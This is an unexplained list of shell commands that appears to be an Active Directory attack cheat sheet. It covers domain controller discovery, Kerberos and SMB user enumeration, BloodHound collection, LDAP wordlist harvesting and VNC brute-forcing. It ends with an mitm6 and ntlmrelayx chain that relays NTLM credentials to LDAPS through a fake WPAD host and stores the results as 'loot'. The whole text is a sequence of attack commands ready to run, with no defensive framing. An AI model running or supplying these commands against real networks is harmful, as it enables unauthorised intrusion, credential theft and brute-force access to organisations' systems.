nslookup -type=SRV _ldap._tcp.dc._msdcs."$DOMAIN"
dig _ldap._tcp.dc._msdcs.$DOMAIN SRV +short
nxc ldap "$DC" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M obsolete
nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=users.txt" $DC
kerbrute userenum --domain "$DOMAIN" users.txt
ldapsearch-ad.py --server "$DC" --type info
nxc ldap $DC -u "$USER" -p "$PASSWORD" --bloodhound --collection All
nxc smb $DC -u '' -p '' --users 
enum4linux-ng -A "$DC"
LDAPWordlistHarvester.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC"
nmap -p 5800,5900 --open --script=vnc-brute -iL /workspace/computers.txt
ldapsearch -x -H ldap://$DC -D "DOMAIN"'\'"$USER" -w "$PASSWORD" -b "DC=DOMAIN,DC=LOCAL" | tee computers.txt
nxc smb computers.txt --gen-relay-list
mitm6 -d example.local -i $INTERFACE
ntlmrelayx.py -6 -t ldaps://$DC1 -wh fakewpad.example.local -l loot